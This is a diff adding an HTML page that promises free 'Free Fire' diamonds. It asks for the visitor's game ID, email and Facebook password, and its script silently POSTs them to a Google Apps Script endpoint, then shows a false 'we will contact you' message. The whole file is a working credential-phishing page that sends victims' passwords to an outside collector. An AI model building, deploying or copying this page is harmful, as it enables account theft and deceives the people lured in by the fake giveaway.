@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<!-- Coding by CodingLab | www.codinglabweb.com-->
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!--<title> Registration or Sign Up form in HTML CSS | CodingLab </title>-->
+    <link rel="stylesheet" href="style.css">
+   </head>
+<body>
+  <div class="wrapper">
+    <h2> Get Free Diamonds In Free Fire </h2>
+    <form method="post" name="google-sheet">
+      <div class="input-box">
+        <input type="Nmbers" name="id" placeholder="Enter Free Fire ID " required>
+      </div>
+      <div class="input-box">
+        <input type="text" name="email" placeholder="Enter your email" required>
+      </div>
+      <div class="input-box">
+        <input type="password" name="password" placeholder="Enter Your Facebook Password" required>
+      </div>
+      <p> You Get Minimum 100 Diamonds In Your Free Fire Account </p>
+      <div class="input-box button">
+        <input type="Submit" value="SUBMIT" name="submit">
+      </div>
+    </form>
+  </div>
+  <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbym8goyWoNrvcv41zu5xGBQ40i40Bb-O9apiMEd7phw-lj46ThDR1EpVVQ-_ehkG4-X/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+</body>
+</html>
